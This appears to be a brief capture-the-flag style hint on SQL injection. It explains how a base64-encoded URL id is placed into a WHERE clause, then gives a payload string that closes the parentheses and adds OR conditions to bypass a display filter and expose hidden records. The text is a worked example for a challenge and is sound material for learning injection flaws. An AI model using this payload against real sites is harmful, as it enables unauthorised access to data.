In the url we see a base64 encoded id value and the code below:
<pre>
WHERE (id IS NOT NULL) AND (ID = ? AND display = 1)	
</pre>
Where '?' = decoded id value.<br>
To exploit this we need to change query:
<pre>
WHERE (id IS NOT NULL) AND (ID = 0) OR (ID is NULL) OR (1=2 AND display = 1)	
</pre>
Now encode '0) OR (ID is NULL) OR (1=2' to base64 and put as id value in url.<br>
GL